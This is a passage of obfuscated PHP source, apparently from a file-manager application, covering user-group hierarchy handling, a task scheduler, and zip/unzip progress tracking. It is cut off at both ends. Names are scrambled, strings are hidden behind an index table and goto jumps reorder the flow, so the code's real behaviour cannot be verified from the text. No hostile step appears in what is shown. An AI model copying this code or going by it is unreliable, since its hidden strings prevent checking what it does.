($¯¨¢Ü¯ as &$û—ç²“‡) { $Û¬õ…İÓ[$û—ç²“‡[$ŞŸ©Ü¦“[1444]]] = $û—ç²“‡[$ŞŸ©Ü¦“[32]]; $è»‰ôáŸ = $this->parentLevelArray($û—ç²“‡[$ŞŸ©Ü¦“[601]]); foreach ($è»‰ôáŸ as $‘ßôö÷Ø) { if (!isset($Û¬õ…İÓ[$‘ßôö÷Ø])) { $Û¬õ…İÓ[$‘ßôö÷Ø] = 0; } } } unset($û—ç²“‡); foreach ($Û¬õ…İÓ as $ŠÃûàÇ¢ => $ôµì˜ñï) { if ($ôµì˜ñï) { continue; } $ÏË¶¤ñä = $this->getInfoSimple($ŠÃûàÇ¢); $Û¬õ…İÓ[$ŠÃûàÇ¢] = $ÏË¶¤ñä[$ŞŸ©Ü¦“[32]]; } $Ï‰µç÷ = $GLOBALS[$ŞŸ©Ü¦“[6]][$ŞŸ©Ü¦“[92]][$ŞŸ©Ü¦“[2241]]; if (KodUser::isRoot()) { $Ï‰µç÷ = !1; } foreach ($¯¨¢Ü¯ as &$û—ç²“‡) { $è»‰ôáŸ = $this->parentLevelArray($û—ç²“‡[$ŞŸ©Ü¦“[601]]); $ÕíÅ¡™¶ = $ŞŸ©Ü¦“[12]; foreach ($è»‰ôáŸ as $ŠÃûàÇ¢ => $‘ßôö÷Ø) { if ($Ï‰µç÷ && $ŠÃûàÇ¢ == 0) { continue; } $ÕíÅ¡™¶ .= $Û¬õ…İÓ[$‘ßôö÷Ø] . $ŞŸ©Ü¦“[8]; } if ($è»‰ôáŸ) { $ÕíÅ¡™¶ .= $û—ç²“‡[$ŞŸ©Ü¦“[32]]; } $û—ç²“‡[$ŞŸ©Ü¦“[606]] = str_replace($ŞŸ©Ü¦“[256], $ŞŸ©Ü¦“[8], $ÕíÅ¡™¶); } unset($û—ç²“‡); } private function _listAppendSourceRoot(&$ œ‰¹¬…, $â¢©ÑÅ) { $¹ˆƒºÓ» =& $_SERVER[±Ö‰ô½¯]; $‰Ğıú = Model($¹ˆƒºÓ»[930])->listSourceRoot(SourceModel::TYPE_GROUP, $â¢©ÑÅ); $‰Ğıú = array_to_keyvalue($‰Ğıú, $¹ˆƒºÓ»[586]); $‰Ğıú = array_remove_key($‰Ğıú, $¹ˆƒºÓ»[586]); foreach ($ œ‰¹¬… as &$‡¢Åùê) { $‡¢Åùê[$¹ˆƒºÓ»[90]] = $‰Ğıú[$‡¢Åùê[$¹ˆƒºÓ»[1444]]] ? $‰Ğıú[$‡¢Åùê[$¹ˆƒºÓ»[1444]]] : array(); } unset($‡¢Åùê); } protected function groupMerge($·ì¼ÊÊ) { $·ì¼ÊÊ = array_values(array_unique($·ì¼ÊÊ)); $ğ¿²—½³ = array(); for ($ğÚ’şÄ = 0; $ğÚ’şÄ < count($·ì¼ÊÊ); $ğÚ’şÄ++) { $÷Äåëæ‡ = !1; for ($ÆïØŠô‹ = 0; $ÆïØŠô‹ < count($·ì¼ÊÊ); $ÆïØŠô‹++) { if ($ğÚ’şÄ == $ÆïØŠô‹) { continue; } if ($this->isParentOf($·ì¼ÊÊ[$ÆïØŠô‹], $·ì¼ÊÊ[$ğÚ’şÄ])) { $÷Äåëæ‡ = !0; break; } } if (!$÷Äåëæ‡) { $ğ¿²—½³[] = $·ì¼ÊÊ[$ğÚ’şÄ]; } } return $ğ¿²—½³; } protected function isParentOf($˜½ôÔö, $û»ˆ™ÅÔ) { $ãá¶ÕôŸ =& $_SERVER[±Ö‰ô½¯]; if (!$˜½ôÔö || !$û»ˆ™ÅÔ || $˜½ôÔö == $û»ˆ™ÅÔ) { return !1; } $ Ú˜öí— = $this->getInfoSimple($˜½ôÔö); $ÎïáŞ•ì = $this->getInfoSimple($û»ˆ™ÅÔ); $‰ßòÂä§ = $ Ú˜öí—[$ãá¶ÕôŸ[601]] . $˜½ôÔö . $ãá¶ÕôŸ[50]; if (substr($ÎïáŞ•ì[$ãá¶ÕôŸ[601]], 0, strlen($‰ßòÂä§)) == $‰ßòÂä§) { return !0; } return !1; } public function groupShowRoot($¦—¶öíÖ, $÷¬À Ä© = false) { $À”ğÛ´ =& $_SERVER[±Ö‰ô½¯]; $àÑûñ£Ù = $this->getInfo($¦—¶öíÖ); if (!$àÑûñ£Ù) { return array(); } $ÂÉ¹ßãğ = $this->parentLevelArray($àÑûñ£Ù[$À”ğÛ´[601]]); $ÄÁì‹¦  = array($¦—¶öíÖ); if (count($ÂÉ¹ßãğ) == 0) { return $ÄÁì‹¦ ; } if ($÷¬À Ä© && count($ÂÉ¹ßãğ) == 1) { return $ÄÁì‹¦ ; } if (!$àÑûñ£Ù[$À”ğÛ´[552]] || !isset($àÑûñ£Ù[$À”ğÛ´[552]][$À”ğÛ´[2222]]) || $àÑûñ£Ù[$À”ğÛ´[552]][$À”ğÛ´[2222]] == $À”ğÛ´[876]) { return $this->groupShowRoot($ÂÉ¹ßãğ[count($ÂÉ¹ßãğ) - 1], $÷¬À Ä©); } if ($àÑûñ£Ù[$À”ğÛ´[552]][$À”ğÛ´[2222]] == $À”ğÛ´[434]) { $êäßúÄ¥ = explode($À”ğÛ´[50], $àÑûñ£Ù[$À”ğÛ´[552]][$À”ğÛ´[2223]]); if ($êäßúÄ¥) { $ÄÁì‹¦  = array_merge($ÄÁì‹¦ , $êäßúÄ¥); } } return $ÄÁì‹¦ ; } protected function resetParentLevel() { $â„ï–Œ =& $_SERVER[±Ö‰ô½¯]; $À›šÀ‚µ = $â„ï–Œ[1444]; $²‹§Æ˜È = $this->select(); $²‹§Æ˜È = array_to_keyvalue($²‹§Æ˜È, $À›šÀ‚µ); foreach ($²‹§Æ˜È as $öš´ß) { $…•û£™ = $öš´ß; $Š”şÄ… = array(); while ($…•û£™[$â„ï–Œ[192]] != 0) { $Š”şÄ…[] = $…•û£™[$â„ï–Œ[192]]; $…•û£™ = $²‹§Æ˜È[$…•û£™[$â„ï–Œ[192]]]; } $Š”şÄ…[] = 0; $Š”şÄ… = $â„ï–Œ[50] . implode($â„ï–Œ[50], array_reverse($Š”şÄ…)) . $â„ï–Œ[50]; $this->setNamePinyin($öš´ß[$À›šÀ‚µ], $öš´ß[$â„ï–Œ[32]]); $this->where(array($À›šÀ‚µ => $öš´ß[$À›šÀ‚µ]))->save(array($â„ï–Œ[672] => $Š”şÄ…)); } return $²‹§Æ˜È; } public function groupNameAuto($™Œ‚çÍø, $¾œ…º­£) { $“€æîõ£ =& $_SERVER[±Ö‰ô½¯]; $Ãü„ŠÄ = $this->where(array($“€æîõ£[489] => $™Œ‚çÍø))->getField($“€æîõ£[32], !0); if (!$Ãü„ŠÄ || !in_array($¾œ…º­£, $Ãü„ŠÄ)) { return $¾œ…º­£; } for ($àïÖ¬— = 1; $àïÖ¬— <= count($Ãü„ŠÄ) + 1; $àïÖ¬—++) { $åÉòò°Ñ = $¾œ…º­£ . "\x28{$àïÖ¬—}\51"; if (!in_array($åÉòò°Ñ, $Ãü„ŠÄ)) { return $åÉòò°Ñ; } } } public function groupSwitch($£“Â÷¢, $Ÿ”ñÈœÅ) { $˜×Œî÷ç =& $_SERVER[±Ö‰ô½¯]; $Ñäş¶‰ = array($˜×Œî÷ç[1444] => array($˜×Œî÷ç[7], array($£“Â÷¢, $Ÿ”ñÈœÅ))); $¡ü¶²ï = $this->where($Ñäş¶‰)->select(); $¡ü¶²ï = array_to_keyvalue($¡ü¶²ï, $˜×Œî÷ç[1444]); $®Ù¸¹Â« = _get($¡ü¶²ï, $£“Â÷¢); $øêìÙ¨ = _get($¡ü¶²ï, $Ÿ”ñÈœÅ); if (!$®Ù¸¹Â« || !$øêìÙ¨ || $®Ù¸¹Â«[$˜×Œî÷ç[192]] == 0) { return !1; } if ($®Ù¸¹Â«[$˜×Œî÷ç[1444]] == $øêìÙ¨[$˜×Œî÷ç[1444]]) { return !1; } if (strpos($øêìÙ¨[$˜×Œî÷ç[601]], $®Ù¸¹Â«[$˜×Œî÷ç[601]] . $®Ù¸¹Â«[$˜×Œî÷ç[1444]] . $˜×Œî÷ç[50]) === 0) { return !1; } $Ñäş¶‰ = array($˜×Œî÷ç[1444] => $£“Â÷¢); $ûÚùªÎ¦ = Model($˜×Œî÷ç[2228])->where($Ñäş¶‰)->select(); if (!$ûÚùªÎ¦) { $ûÚùªÎ¦ = array(); } foreach ($ûÚùªÎ¦ as $˜–Ì’â¼) { $¨õÂ¡ù = $˜–Ì’â¼[$˜×Œî÷ç[1542]]; $Ñäş¶‰ = array($˜×Œî÷ç[1542] => $¨õÂ¡ù, $˜×Œî÷ç[1444] => $Ÿ”ñÈœÅ); $¯Ã‘âä = Model($˜×Œî÷ç[2228])->where($Ñäş¶‰)->find(); if (!$¯Ã‘âä) { $¤À¨¨Ë’ = array($Ÿ”ñÈœÅ => $˜–Ì’â¼[$˜×Œî÷ç[1589]]); Model($˜×Œî÷ç[614])->userGroupAdd($¨õÂ¡ù, $¤À¨¨Ë’); } Model($˜×Œî÷ç[614])->userGroupRemove($¨õÂ¡ù, $£“Â÷¢); } $Ñäş¶‰ = array($˜×Œî÷ç[190] => 2, $˜×Œî÷ç[192] => 0, $˜×Œî÷ç[497] => 1, $˜×Œî÷ç[586] => array($˜×Œî÷ç[7], array($£“Â÷¢, $Ÿ”ñÈœÅ))); $®¡íı‘Ü = Model($˜×Œî÷ç[930])->where($Ñäş¶‰)->field($˜×Œî÷ç[2242])->select(); $®¡íı‘Ü = array_to_keyvalue($®¡íı‘Ü, $˜×Œî÷ç[586], $˜×Œî÷ç[193]); $ãûœÑ¯ = !empty($®¡íı‘Ü[$£“Â÷¢]) ? $®¡íı‘Ü[$£“Â÷¢] : !1; if ($ãûœÑ¯) { if (!$®¡íı‘Ü[$Ÿ”ñÈœÅ]) { $®¡íı‘Ü[$Ÿ”ñÈœÅ] = Model($˜×Œî÷ç[930])->groupRootAdd($Ÿ”ñÈœÅ); } $õ”™æìº = $®¡íı‘Ü[$Ÿ”ñÈœÅ]; $Ñäş¶‰ = array($˜×Œî÷ç[192] => $ãûœÑ¯); $®¡íı‘Ü = Model($˜×Œî÷ç[930])->where($Ñäş¶‰)->field($˜×Œî÷ç[2243])->select(); if (!$®¡íı‘Ü) { $®¡íı‘Ü = array(); } Model($˜×Œî÷ç[930])->moveClearAuth = !1; foreach ($®¡íı‘Ü as $´ÓÅ×ğÔ) { $‹Ôƒ€ığ = $´ÓÅ×ğÔ[$˜×Œî÷ç[497]] == $˜×Œî÷ç[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($˜×Œî÷ç[930])->move($´ÓÅ×ğÔ[$˜×Œî÷ç[193]], $õ”™æìº, $‹Ôƒ€ığ); } Model($˜×Œî÷ç[930])->moveClearAuth = !0; $Ñäş¶‰ = array($˜×Œî÷ç[190] => 2, $˜×Œî÷ç[586] => $£“Â÷¢); $ºôë©Éì = array($˜×Œî÷ç[586] => $Ÿ”ñÈœÅ); Model($˜×Œî÷ç[2244])->where($Ñäş¶‰)->save($ºôë©Éì); Model($˜×Œî÷ç[2245])->where($Ñäş¶‰)->save($ºôë©Éì); } $this->_changeChildLevel($¡ü¶²ï[$£“Â÷¢], $¡ü¶²ï[$Ÿ”ñÈœÅ], !0); $this->where(array($˜×Œî÷ç[192] => $£“Â÷¢))->save(array($˜×Œî÷ç[192] => $Ÿ”ñÈœÅ)); $this->_clearChildrenCache($¡ü¶²ï[$Ÿ”ñÈœÅ]); return !0; } } $_file = $_SERVER[$_SERVER[±Ö‰ô½¯][1699]]; $_size = $_SERVER[±Ö‰ô½¯][1846]; goto b”ö‰Ô…©˜; FçàÎ“‰µ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ô“®‚, $³ğ‹¦âÒ = 5.0) { if (!$Ô“®‚) { return; } $«ú¬®…è = Cache::get($Ô“®‚); if (!$«ú¬®…è || timeFloat() - floatVal($«ú¬®…è) >= $³ğ‹¦âÒ) { Cache::set($Ô“®‚, timeFloat(), $³ğ‹¦âÒ * 10); return !0; } return !1; } public static function timeLimitCall($‡Ñ±“Ôä, $Š³œöÍú, $Á¿íÇ©à, $³¥ÑÇ = 5.0) { $üÅİˆ¹¬ =& $_SERVER[±Ö‰ô½¯]; if (!$‡Ñ±“Ôä || !$Š³œöÍú) { return; } self::$asyncAdd = !0; $£õƒ•ù© = $üÅİˆ¹¬[2046]; $øÀ´ø = Cache::get($£õƒ•ù©, !0); $„Ş›¶‚¿ = array($üÅİˆ¹¬[2047] => timeFloat(), $üÅİˆ¹¬[2048] => timeFloat(), $üÅİˆ¹¬[344] => $Š³œöÍú, $üÅİˆ¹¬[2038] => $Á¿íÇ©à, $üÅİˆ¹¬[2049] => $³¥ÑÇ); if (is_array($øÀ´ø[$‡Ñ±“Ôä])) { if (timeFloat() - $øÀ´ø[$‡Ñ±“Ôä][$üÅİˆ¹¬[2047]] <= $„Ş›¶‚¿[$üÅİˆ¹¬[2049]] * 0.5) { return; } $„Ş›¶‚¿[$üÅİˆ¹¬[2048]] = $øÀ´ø[$‡Ñ±“Ôä][$üÅİˆ¹¬[2048]]; } $øÀ´ø[$‡Ñ±“Ôä] = $„Ş›¶‚¿; Cache::set($£õƒ•ù©, $øÀ´ø, 60); Cache::removeMemory($£õƒ•ù©); write_log($üÅİˆ¹¬[2050] . $‡Ñ±“Ôä . $üÅİˆ¹¬[74] . $Š³œöÍú . $üÅİˆ¹¬[2051] . ACTION, $üÅİˆ¹¬[197]); } public static function timeLimitCallLoop() { $ÒÙ‘Ê =& $_SERVER[±Ö‰ô½¯]; $ğÄ°´»„ = array($ÒÙ‘Ê[2052]); $ÍëúÖì² = in_array(strtolower(ACTION), $ğÄ°´»„); if (!$ÍëúÖì² && !self::$asyncAdd) { return; } $û¾ğ•“ = $ÒÙ‘Ê[2046]; $Å½¸ìÌ = Cache::get($û¾ğ•“, !0); if (!$Å½¸ìÌ || count($Å½¸ìÌ) <= 0) { return; } $š“ù˜“ş = timeFloat(); $Øµ‡æ€Ü = array(); $…Ù¶ìã = array(); foreach ($Å½¸ìÌ as $¡Ì§†€¹ => $ÎØşÎÎ) { if ($š“ù˜“ş - $ÎØşÎÎ[$ÒÙ‘Ê[2048]] > $ÎØşÎÎ[$ÒÙ‘Ê[2049]]) { $…Ù¶ìã[$¡Ì§†€¹] = $ÎØşÎÎ; continue; } $Øµ‡æ€Ü[$¡Ì§†€¹] = $ÎØşÎÎ; } if (count($…Ù¶ìã) == 0) { return; } if (count($Øµ‡æ€Ü) == 0) { Cache::remove($û¾ğ•“); } else { Cache::set($û¾ğ•“, $Øµ‡æ€Ü, 60); } Cache::removeMemory($û¾ğ•“); self::runArr($…Ù¶ìã); } public static function finished($ò‡¢îú†, $é®°Úü®) { $ˆı¹êáŠ =& $_SERVER[±Ö‰ô½¯]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ˆı¹êáŠ[344] => $ò‡¢îú†, $ˆı¹êáŠ[2038] => $é®°Úü®); } private static function runArr($à±ùØ) { $¹Ø®«ìÜ =& $_SERVER[±Ö‰ô½¯]; if (!$à±ùØ) { return; } foreach ($à±ùØ as $¿Œ˜´ˆÙ => $×ÂÒÌÔ) { try { Hook::apply($×ÂÒÌÔ[$¹Ø®«ìÜ[344]], $×ÂÒÌÔ[$¹Ø®«ìÜ[2038]]); write_log($¹Ø®«ìÜ[2053] . $¿Œ˜´ˆÙ . $¹Ø®«ìÜ[74] . $×ÂÒÌÔ[$¹Ø®«ìÜ[344]] . $¹Ø®«ìÜ[2051] . ACTION, $¹Ø®«ìÜ[197]); } catch (Exception $³Ü©àŒŞ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $‰ùÙ€¹“ =& $_SERVER[±Ö‰ô½¯]; parent::startAfter(); Hook::bind($‰ùÙ€¹“[2054], array($this, $‰ùÙ€¹“[2055])); Hook::bind($‰ùÙ€¹“[1330], array($this, $‰ùÙ€¹“[2056])); Hook::bind($‰ùÙ€¹“[2057], array($this, $‰ùÙ€¹“[2058])); $ªÒ„¬¬Â =& $this->task; $ªÒ„¬¬Â[$‰ùÙ€¹“[2059]] = $‰ùÙ€¹“[1331]; if (!$ªÒ„¬¬Â[$‰ùÙ€¹“[1815]]) { $ªÒ„¬¬Â[$‰ùÙ€¹“[1815]] = LNG($‰ùÙ€¹“[2060]); } } protected function endAfter() { $‚»Ü”‘º =& $_SERVER[±Ö‰ô½¯]; parent::endAfter(); Hook::unbind($‚»Ü”‘º[2054], array($this, $‚»Ü”‘º[2055])); Hook::unbind($‚»Ü”‘º[1330], array($this, $‚»Ü”‘º[2056])); Hook::unbind($‚»Ü”‘º[2057], array($this, $‚»Ü”‘º[2058])); } public function updateAfter() { $·ä¹°ƒ =& $_SERVER[±Ö‰ô½¯]; $ôèıãâ‘ =& $this->task; if (!$ôèıãâ‘[$·ä¹°ƒ[1178]] || !$ôèıãâ‘[$·ä¹°ƒ[861]]) { if ($ôèıãâ‘[$·ä¹°ƒ[2059]] != $·ä¹°ƒ[390]) { return; } } if ($ôèıãâ‘[$·ä¹°ƒ[2059]] == $·ä¹°ƒ[1331]) { $Ä¸…·™­ = 0; if ($ôèıãâ‘[$·ä¹°ƒ[1983]]) { $Ä¸…·™­ = $ôèıãâ‘[$·ä¹°ƒ[1984]] / $ôèıãâ‘[$·ä¹°ƒ[1983]]; } $ôèıãâ‘[$·ä¹°ƒ[1931]] = $Ä¸…·™­ * 0.3; } else { if ($ôèıãâ‘[$·ä¹°ƒ[2059]] == $·ä¹°ƒ[390]) { $Ä¸…·™­ = $ôèıãâ‘[$·ä¹°ƒ[1930]] / $ôèıãâ‘[$·ä¹°ƒ[1178]]; $ôèıãâ‘[$·ä¹°ƒ[1931]] = 0.3 + $Ä¸…·™­ * 0.4; } else { if ($ôèıãâ‘[$·ä¹°ƒ[2059]] == $·ä¹°ƒ[108]) { $Æ‡ìˆè• = 0; if ($ôèıãâ‘[$·ä¹°ƒ[1985]] == $·ä¹°ƒ[108]) { $Æ‡ìˆè• = $ôèıãâ‘[$·ä¹°ƒ[1984]]; } $Ä¸…·™­ = ($ôèıãâ‘[$·ä¹°ƒ[1988]] + $Æ‡ìˆè•) / $ôèıãâ‘[$·ä¹°ƒ[861]]; $ôèıãâ‘[$·ä¹°ƒ[1931]] = 0.3 + 0.4 + $Ä¸…·™­ * 0.3; } } } if ($ôèıãâ‘[$·ä¹°ƒ[1931]] > 0) { $†Ì†µ…Ü = timeFloat() - $ôèıãâ‘[$·ä¹°ƒ[1933]] - $ôèıãâ‘[$·ä¹°ƒ[1936]]; $ôèıãâ‘[$·ä¹°ƒ[1937]] = $†Ì†µ…Ü * (1 - $ôèıãâ‘[$·ä¹°ƒ[1931]]) / $ôèıãâ‘[$·ä¹°ƒ[1931]]; } } public function addFile($—¿â˜ˆ‰) { $®†²ï÷ =& $_SERVER[±Ö‰ô½¯]; $ˆÔôó›ã =& $this->task; $øˆşº¥é = IO::info($—¿â˜ˆ‰); $ˆÔôó›ã[$®†²ï÷[1981]] = $øˆşº¥é[$®†²ï÷[32]]; $ˆÔôó›ã[$®†²ï÷[1983]] = $øˆşº¥é[$®†²ï÷[79]]; $ˆÔôó›ã[$®†²ï÷[1984]] = 0; $ˆÔôó›ã[$®†²ï÷[1180]] = $®†²ï÷[2012]; $ˆÔôó›ã[$®†²ï÷[1985]] = $®†²ï÷[1331]; $ˆÔôó›ã[$®†²ï÷[861]] = $øˆşº¥é[$®†²ï÷[79]]; $ˆÔôó›ã[$®†²ï÷[1178]] = 1; $í¾ÓËüä = 0; $ˆÔôó›ã[$®†²ï÷[1994]] = array($®†²ï÷[1995] => $í¾ÓËüä + 1, $®†²ï÷[506] => $øˆşº¥é[$®†²ï÷[32]], $®†²ï÷[87] => $øˆşº¥é[$®†²ï÷[87]], $®†²ï÷[599] => $øˆşº¥é[$®†²ï÷[599]] ? $øˆşº¥é[$®†²ï÷[599]] : $øˆşº¥é[$®†²ï÷[87]]); $this->update(); } public function zipEvent($¢Ù™Æ’», $ê®„¶‹ , $È ±¸Ãº, $ÑÛÚ°¹ø) { $‹öåÓó¶ =& $_SERVER[±Ö‰ô½¯]; $†äê´Ç =& $this->task; $†äê´Ç[$‹öåÓó¶[1981]] = get_path_this($ê®„¶‹ ); $†äê´Ç[$‹öåÓó¶[1983]] = $ÑÛÚ°¹ø; $†äê´Ç[$‹öåÓó¶[1984]] = $È ±¸Ãº; $†äê´Ç[$‹öåÓó¶[1180]] = $¢Ù™Æ’» == $‹öåÓó¶[2061] ? $‹öåÓó¶[2062] : $‹öåÓó¶[2063]; $†äê´Ç[$‹öåÓó¶[1985]] = $‹öåÓó¶[12]; $†äê´Ç[$‹öåÓó¶[861]] = $ÑÛÚ°¹ø; $†äê´Ç[$‹öåÓó¶[2059]] = $‹öåÓó¶[390]; $this->update(); } public function unzipAfter($ş£âÕşÕ) { $ã¿½·ó =& $_SERVER[±Ö‰ô½¯]; $™¦ø¸½Ç =& $this->task; $™¦ø¸½Ç[$ã¿½·ó[2059]] = $ã¿½·ó[108]; $Åç–»ëğ = IO::infoWithChildren($ş£âÕşÕ); $¦îÜ¡Ô˜ = 0; $™¦ø¸½Ç[$ã¿½·ó[1994]] = array($ã¿½·ó[1995] => $¦îÜ¡Ô˜ + 1, $ã¿½·ó[506] => $Åç–»ëğ[$ã¿½·ó[32]], $ã¿½·ó[87] => $Åç–»ëğ[$ã¿½·ó[87]], $ã¿½·ó[599] => $Åç–»ëğ[$ã¿½·ó[599]] ? $Åç–»ëğ[$ã¿½·ó[599]] : $Åç–»ëğ[$ã¿½·ó[87]]); if ($Åç–»ëğ[$ã¿½·ó[33]] == $ã¿½·ó[232]) { $™¦ø¸½Ç[$ã¿½·ó[1178]] = 1; } else { $™¦ø¸½Ç[$ã¿½·ó[1178]] = $Åç–»ëğ[$ã¿½·ó[82]][$ã¿½·ó[80]]; } $™¦ø¸½Ç[$ã¿½·ó[1180]] = $ã¿½·ó[12]; $™¦ø¸½Ç[$ã¿½·ó[1985]] = 0; $™¦ø¸½Ç[$ã¿½·ó[1930]] = 0; $™¦ø¸½Ç[$ã¿½·ó[1983]] = 0; $™¦ø¸½Ç[$ã¿½·ó[1984]] = 0; $™¦ø¸½Ç[$ã¿½·ó[1981]] = $ã¿½·ó[12]; $™¦ø¸½Ç[$ã¿½·ó[1988]] = 0; $™¦ø¸½Ç[$ã¿½·ó[861]] = $Åç–»ëğ[$ã¿½·ó[79]]; $this->update(); self::log($ã¿½·ó[2064] . json_encode(array($™¦ø¸½Ç, $Åç–»ëğ))); } public function nameParse($«úå¨É–) { $—Ÿ‹Ü°Û =& $_SERVER[±Ö‰ô½¯]; $£îŸ±´ =& $this->task; if ($£îŸ±´[$—Ÿ‹Ü°Û[2059]] == $—Ÿ‹Ü°Û[1331]) { $£îŸ±´[$—Ÿ‹Ü°Û[2059]] = $—Ÿ‹Ü°Û[390]; $£îŸ±´[$—Ÿ‹Ü°Û[1988]] = 0; $£îŸ±´[$—Ÿ‹Ü°Û[861]] = 0; } $Ãå§ç»ù = get_path_this($«úå¨É–); if (strstr($Ãå§ç»ù, $—Ÿ‹Ü°Û[10])) { $£îŸ±´[$—Ÿ‹Ü°Û[1930]] += 1; $£îŸ±´[$—Ÿ‹Ü°Û[1178]] += 1; } $£îŸ±´[$—Ÿ‹Ü°Û[1981]] = $«úå¨É–; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ğÚ‡¼Ô“ =& $_SERVER[±Ö‰ô½¯]; parent::startAfter(); Hook::bind($ğÚ‡¼Ô“[2065], array($this, $ğÚ‡¼Ô“[2055])); Hook::bind($ğÚ‡¼Ô“[2057], array($this, $ğÚ‡¼Ô“[2058])); $Ô‚ë†š =& $this->task; $Ô‚ë†š[$ğÚ‡¼Ô“[2059]] = $ğÚ‡¼Ô“[1331]; if (!$Ô‚ë†š[$ğÚ‡¼Ô“[1815]]) { $Ô‚ë†š[$ğÚ‡¼Ô“[1815]] = LNG($ğÚ‡¼Ô“[2066]); } } protected function endAfter() { $¢øÂ¬Ì± =& $_SERVER[±Ö‰ô½¯]; parent::endAfter(); Hook::unbind($¢øÂ¬Ì±[2065], array($this, $¢øÂ¬Ì±[2055])); Hook::unbind($¢øÂ¬Ì±[2057], array($this, $¢øÂ¬Ì±[2058])); } public function updateAfter() { $í–•çÆ =& $_SERVER[±Ö‰ô½¯]; $òòı²¬» =& $this->task; if (!$òòı²¬»[$í–•çÆ[1178]] || !$òòı²¬»[$í–•çÆ[861]]) { return; } if ($òòı²¬»[$í–•çÆ[2059]] == $í–•çÆ[1331]) { $şë•öÇş = $òòı²¬»[$í–•çÆ[1984]]; if ($òòı²¬»[$í–•çÆ[1985]] != $í–•çÆ[1331]) { $şë•öÇş = 0; } $ïŞğ§àĞ = ($òòı²¬»[$í–•çÆ[1988]] + $şë•öÇş) / $òòı²¬»[$í–•çÆ[861]]; $òòı²¬»[$í–•çÆ[1931]] = $ïŞğ§àĞ * 0.3; } else { if ($òòı²¬»[$í–•çÆ[2059]] == $í–•çÆ[390]) { $ïŞğ§àĞ = $òòı²¬»[$í–•çÆ[1930]] / $òòı²¬»[$í–•çÆ[1178]]; $òòı²¬»[$í–•çÆ[1931]] = 0.3 + $ïŞğ§àĞ * 0.5; } else { if ($òòı²¬»[$í–•çÆ[2059]] == $í–•çÆ[108]) { $ïŞğ§àĞ = 0; if ($òòı²¬»[$í–•çÆ[1983]]) { $ïŞğ§àĞ = $òòı²¬»[$í–•çÆ[1984]] / $òòı²¬»[$í–•çÆ[1983]]; } $òòı²¬»[$í–•çÆ[1931]] = 0.3 + 0.5 + $ïŞğ§àĞ * 0.2; } } } if ($òòı²¬»[$í–•çÆ[1931]] > 0) { $æ¸¡’“ = timeFloat() - $òòı²¬»[$í–•çÆ[1933]] - $òòı²¬»[$í–•çÆ[1936]]; $òòı²¬»[$í–•çÆ[1937]] = $æ¸¡’“ * (1 - $òòı²¬»[$í–•çÆ[1931]]) / $òòı²¬»[$í–•çÆ[1931]]; } } public function copyFileStart($æ¼¤Ç „, $‘ş·õúã, $¹Ğ¥Éœ©, $Í´À¹±, $¶Šı’Ô®, $”İúş¯¸) { $Û¼©Êíš =& $_SERVER[±Ö‰ô½¯]; parent::copyFileStart($æ¼¤Ç „, $‘ş·õúã, $¹Ğ¥Éœ©, $Í´À¹±, $¶Šı’Ô®, $”İúş¯¸); $¾º²¼¦ä =& $this->task; if ($¾º²¼¦ä[$Û¼©Êíš[2059]] == $Û¼©Êíš[390]) { $¾º²¼¦ä[$Û¼©Êíš[2059]] = $Û¼©Êíš[108]; } $this->update(); } public function copyFileEnd($ˆİíÑÜí, $Ô¢ï€§Ô, $å˜ôÎšÅ, $ö¹úÉ”, $Ø»Ñ´ÌÁ, $Ù¾ı¬×¶) { $ÑöÌ–ÄĞ =& $_SERVER[±Ö‰ô½¯]; $ÅØÔİÄƒ =& $this->task; $ÅØÔİÄƒ[$ÑöÌ–ÄĞ[1984]] = $ÅØÔİÄƒ[$ÑöÌ–ÄĞ[1983]]; $ÅØÔİÄƒ[$ÑöÌ–ÄĞ[1988]] += $ÅØÔİÄƒ[$ÑöÌ–ÄĞ[1983]]; $ÅØÔİÄƒ[$ÑöÌ–ÄĞ[1985]] = $ÑöÌ–ÄĞ[12]; $this->update(); } public function zipEvent($ùˆŒü££, $î™…²ò, $Ï×ªµ¾, $Æ‘ÎÏªÓ) { $ ¨Šö÷ =& $_SERVER[±Ö‰ô½¯]; $‘€Ô¹¿ù =& $this->task; $‘€Ô¹¿ù[$ ¨Šö÷[1981]] = get_path_this($î™…²ò); $‘€Ô¹¿ù[$ ¨Šö÷[1983]] = $Æ‘ÎÏªÓ; $‘€Ô¹¿ù[$ ¨Šö÷[1984]] = $Ï×ªµ¾; $‘€Ô¹¿ù[$ ¨Šö÷[1180]] = $ùˆŒü££ == $ ¨Šö÷[2067] ? $ ¨Šö÷[2062] : $ ¨Šö÷[2063]; $‘€Ô¹¿ù[$ ¨Šö÷[1985]] = $ ¨Šö÷[12]; $‘€Ô¹¿ù[$ ¨Šö÷[861]] = $Æ‘ÎÏªÓ; $‘€Ô¹¿ù[$ ¨Šö÷[2059]] = $ ¨Šö÷[390]; $this->update(); } public function nameParse($ÁĞëÈØİ) { $İ»à¯òş =& $_SERVER[±Ö‰ô½¯]; $º–Ğ­Ÿ =& $this->task; if ($º–Ğ­Ÿ[$İ»à¯òş[1930]] < $º–Ğ­Ÿ[$İ»à¯òş[1178]]) { $­Ûúù¡Ä = get_path_this($ÁĞëÈØİ); if (strstr($­Ûúù¡Ä, $İ»à¯òş[10])) { $º–Ğ­Ÿ[$İ»à¯òş[1930]] += 1; } } if ($º–Ğ­Ÿ[$İ»à¯òş[2059]] == $İ»à¯òş[1331]) { $º–Ğ­Ÿ[$İ»à¯òş[2059]] = $İ»à¯òş[390]; } $º–Ğ­Ÿ[$İ»à¯òş[1981]] = $ÁĞëÈØİ; $this->update(); } } goto EŒàŠÒ‚; C¸£Ş¤è…•: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¾éÙ¤ã¥ = '', $ÁÏÁí¬† = 0) { if (is_string($¾éÙ¤ã¥) && $¾éÙ¤ã¥ != $_SERVER[±Ö‰ô½¯][12]) { $this->prefix = $¾éÙ¤ã¥; } if (is_numeric($ÁÏÁí¬†) && $ÁÏÁí¬† > 0) { $this->expire = $ÁÏÁí¬†; } } public static function getInstance() { static $õ†ó­“Ÿ; if ($õ†ó­“Ÿ === null) { $õ†ó­“Ÿ = new self(); } return $õ†ó­“Ÿ; } private static $cookieDisable = false; public static function disable($ÔİœÖÇß) { self::$cookieDisable = 